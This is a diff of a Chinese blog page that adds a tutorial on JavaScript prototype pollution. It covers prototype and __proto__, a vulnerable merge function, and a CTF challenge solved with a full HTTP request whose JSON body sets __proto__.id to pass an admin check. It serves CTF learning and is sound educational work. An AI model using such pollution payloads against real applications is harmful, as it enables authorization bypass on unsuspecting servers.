@@ -27,7 +27,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/pwnEpiphany/images/main/image-20221119105254021.png">
 <meta property="article:published_time" content="2022-11-18T13:57:26.000Z">
-<meta property="article:modified_time" content="2022-11-19T03:30:27.000Z">
+<meta property="article:modified_time" content="2022-11-19T16:09:23.881Z">
 <meta property="article:author" content="Epiphany">
 <meta property="article:tag" content="反序列化">
 <meta name="twitter:card" content="summary_large_image">
@@ -266,7 +266,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          5.3k 字
+          9.4k 字
         
       </span>
     
@@ -278,7 +278,7 @@
         
         
           <!-- compatible with older versions-->
-          45 分钟
+          79 分钟
         
       </span>
     
@@ -604,7 +604,189 @@ poc<span class="token operator">=</span><span class="token constant">O</span><sp
 <p>同样的需要绕过wakeup函数</p>
 <p>ps: 😸总的来说反序列化对pwn手来说比较友好，漏洞的类型和利用，都是代码漏洞，没有sql注入之类的那么多waf和弯弯肠子😢</p>
 <h2 id="JavaScript原型链污染"><a class="header-anchor" href="#JavaScript原型链污染">¶</a>JavaScript原型链污染</h2>
-<p>这个听起来比较高级，实际上也不是很高级，涉及到面向对象的知识比较多，感觉对新人不是很友好，这个必须从基础原理开始，</p>
+<p>这个听起来比较高级，实际上也不是很高级，涉及到面向对象的知识比较多，感觉对新人不是很友好，这个必须从基础原理开始，首先要理解的是JavaScript中，一切皆对象的一种理念，同时类和类之间又存在着继承关系，所以有着原型的说法。</p>
+<h3 id="prototype-和-proto"><a class="header-anchor" href="#prototype-和-proto">¶</a><code>prototype</code> 和 <code>__proto__</code></h3>
+<p>在JavaScript中，如果要定义一个类，那么需要以定义**“构造函数”**的方式来的定义，换句话说，即每个JavaScript对象都有相应的构造函数，例如</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">function Foo() &#123;
+    this.bar &#x3D; 1
+&#125;
+
+new Foo()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>这里的<code>Foo</code>函数就是构造函数，<code>bar</code>是<code>Foo</code>类的一个成员变量</p>
+<blockquote>
+<p>以上是原始的构造方法，在ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖。</p>
+</blockquote>
+<p>一个类除了成员变量，一定还有方法，function定义在类的构造函数当中：</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">1</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">show</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>bar<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>但是这里有一个问题，show函数以变量的形式写在构造函数当中，那么这个show函数实际上是和对象绑定的，而不是和类绑定的，即上述的代码中show函数会执行两次；</p>
+<blockquote>
+<p>但是这个问题貌似在较新版本中也不存在</p>
+</blockquote>
+<p>如果希望show函数被 定义在类上那么就需要用到<code>prototype</code>属性了，<code>prototype</code>为原型的意思，是类的一个属性，通过这个属性可以访问到Foo类的原型</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">show</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>bar<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+foo<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>用以上的办法把类定义在Foo的原型中，这样所有Foo的实例化对象都具有从原型继承下来的show函数。</p>
+<p><img src="https://raw.githubusercontent.com/pwnEpiphany/images/main/image-20221119232937431.png" srcset="/img/loading.gif" lazyload alt="image-20221119232937431"></p>
+<p>可以很明显的发现，Foo的prototype属性在执行完毕show的定义之后，就多出来了show方法，且被继承到了foo中。</p>
+<p>讲完了<code>prototype</code>就看到<code>__proto__</code>，有以下等式。</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">foo<span class="token punctuation">.</span>__proto__ <span class="token operator">==</span> <span class="token class-name">Foo</span><span class="token punctuation">.</span>prototype<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure>
+<p>实例化出来的对象可以通过<code>__proto__</code>访问Foo类的原型。</p>
+<ol>
+<li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
+<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
+</ol>
+<h3 id="原型链继承和污染"><a class="header-anchor" href="#原型链继承和污染">¶</a>原型链继承和污染</h3>
+<p>上面提到的第一点，所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特点被JavaScript利用作为类的继承方法。</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Father</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>first_name <span class="token operator">=</span> <span class="token string">'Donald'</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>last_name <span class="token operator">=</span> <span class="token string">'Trump'</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">function</span> <span class="token function">Son</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>first_name <span class="token operator">=</span> <span class="token string">'Melania'</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token class-name">Son</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Father</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">let</span> son <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Son</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Name: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>son<span class="token punctuation">.</span>first_name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>son<span class="token punctuation">.</span>last_name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>以上的代码中，<code>Father</code>类的<code>last_name</code>被继承给了<code>Son</code>，所以输出是Name: Melania Trump。需要知道的是，JavaScript引擎在寻找son的last_name的时候做了什么：</p>
+<ol>
+<li>在对象son中寻找last_name</li>
+<li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li>
+<li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li>
+<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
+</ol>
+<p>简单的来说就是不断地寻找类的原型，查看他们的属性，直到为NULL或者找到。</p>
+<p><img src="https://raw.githubusercontent.com/pwnEpiphany/images/main/image-20221119234035784.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>可以看见son的prototype中实际上也有firstname，但是son自己有了，所以就没有向上回溯，JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p>
+<p>牢记以下几点即可</p>
+<ol>
+<li>foo.<code>__ptoto__</code> == Foo.prototype</li>
+<li>每个构造函数(constructor)都有一个原型对象(prototype)</li>
+</ol>
+<p><strong>原型链污染</strong>利用的就是JavaScript这个继承的机制，通过类A污染原型类，从而达到修改同一原型的类B的成员变量和函数。</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// foo是一个简单的JavaScript对象</span>
+<span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">bar</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span>
+
+<span class="token comment">// foo.bar 此时为1</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span>
+
+<span class="token comment">// 修改foo的原型（即Object）</span>
+foo<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">2</span>
+
+<span class="token comment">// 由于查找顺序的原因，foo.bar仍然是1</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span>
+
+<span class="token comment">// 此时再用Object创建一个空的zoo对象</span>
+<span class="token keyword">let</span> zoo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+
+<span class="token comment">// 查看zoo.bar</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>zoo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>以上代码的运行结果为</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">1
+1
+2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>foo对象通过<code>__proto__</code>属性修改了foo的原型，然后新建的zoo继承了该变量，下面可以看一张调试图</p>
+<p><img src="https://raw.githubusercontent.com/pwnEpiphany/images/main/image-20221119234850521.png" srcset="/img/loading.gif" lazyload alt="image-20221119234850521"></p>
+<p>修改了Foo的原型的bar，设置其为2，然后执行到<code>let zoo=&#123;&#125;</code></p>
+<p><img src="https://raw.githubusercontent.com/pwnEpiphany/images/main/image-20221119234947567.png" srcset="/img/loading.gif" lazyload alt="image-20221119234947567"></p>
+<p>实际上zoo自己没有这个属性，由于前面提到的查找顺序，导致了会向zoo的<code>__proto__</code>中寻找，所以找到了目标变量。</p>
+<p>下面给一个例子，merge函数</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">let</span> o1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+<span class="token keyword">let</span> o2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string-property property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+<span class="token function">merge</span><span class="token punctuation">(</span>o1<span class="token punctuation">,</span> o2<span class="token punctuation">)</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o1<span class="token punctuation">.</span>a<span class="token punctuation">,</span> o1<span class="token punctuation">.</span>b<span class="token punctuation">)</span>
+
+o3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o3<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>merge函数的意思是复制，具体的方法看函数实现可以知道，如果有相同的key就覆盖，没有就创建。</p>
+<p>按理说，执行完毕下面的代码之后，o1的<code>__proto__</code>就变成了<code>&#123;b : 2&#125;</code></p>
+<p>输出的话o1.b=2</p>
+<p>但是运行之后，发现结果不是这样。</p>
+<p><img src="https://raw.githubusercontent.com/pwnEpiphany/images/main/image-20221119235809441.png" srcset="/img/loading.gif" lazyload alt="image-20221119235809441"></p>
+<blockquote>
+<p>o3并没有继承到相关的方法</p>
+</blockquote>
+<p>查看后发现o1获得了b这个属性，但是b存在于o1中而不是o1的prototype中。</p>
+<p><img src="https://raw.githubusercontent.com/pwnEpiphany/images/main/image-20221119235905696.png" srcset="/img/loading.gif" lazyload alt="image-20221119235905696"></p>
+<p>这就是出现问题的点，o1和o2不是一个原型，即<code>__proto__</code>没有被识别为一个key，（可以跟进去遍历merge得到结果）</p>
+<blockquote>
+<p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
+</blockquote>
+<p>做出的改变是，使用json函数格式化数据，而不是手动的引号</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> o1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+<span class="token keyword">let</span> o2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span><span class="token punctuation">)</span>
+<span class="token function">merge</span><span class="token punctuation">(</span>o1<span class="token punctuation">,</span> o2<span class="token punctuation">)</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o1<span class="token punctuation">.</span>a<span class="token punctuation">,</span> o1<span class="token punctuation">.</span>b<span class="token punctuation">)</span>
+
+o3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o3<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p><img src="https://raw.githubusercontent.com/pwnEpiphany/images/main/image-20221120000209850.png" srcset="/img/loading.gif" lazyload alt="image-20221120000209850"></p>
+<p>成功污染</p>
+<h3 id="例题"><a class="header-anchor" href="#例题">¶</a>例题</h3>
+<p>例题很简单，做了很久是因为没有考虑到上面说的json，</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> 
+	<span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag'</span><span class="token punctuation">;</span>
+		<span class="token keyword">var</span> admin <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+		<span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+		<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
+			<span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span> 
+		<span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+			res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"copy error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token keyword">return</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+		<span class="token keyword">if</span><span class="token punctuation">(</span>admin<span class="token punctuation">.</span>id<span class="token operator">===</span><span class="token string">'unctf'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+			res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+		<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+			<span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>copy函数可以利用，通过user污染admin即可，重点在于发出的数据包，添加<code>Content-type</code>，设置为<code>application/json</code>否则POST的数据就会被识别为字符，导致上面说的错误</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Pragma</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span>
+<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span>
+<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">28</span></span>
+<span class="token application-json">
+<span class="token punctuation">&#123;</span><span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">"id"</span><span class="token operator">:</span><span class="token string">"unctf"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<hr>
+<h3 id="breaking"><a class="header-anchor" href="#breaking">¶</a>breaking</h3>
 
                 
               </div>
